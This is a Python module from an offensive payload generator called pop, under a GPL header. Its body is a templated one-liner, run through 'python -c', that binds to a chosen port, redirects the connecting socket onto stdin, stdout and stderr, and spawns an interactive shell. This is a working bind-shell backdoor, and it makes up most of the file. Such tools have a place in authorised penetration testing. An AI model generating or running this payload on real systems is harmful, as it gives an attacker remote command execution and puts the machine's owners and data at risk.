#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

USAGE = 'port'
NARGS = [1, 1]
LANG = 'py'
EXEC = '''
python -c "PAYLOAD"
'''

pl = '''
import os,socket,subprocess;VAR1=socket.socket();VAR1.bind(('',ARG1));VAR1.listen();VAR2,_=VAR1.accept();[os.dup2(VAR2.fileno(),i) for i in [0,1,2]];subprocess.call(['sh','-i'])
'''
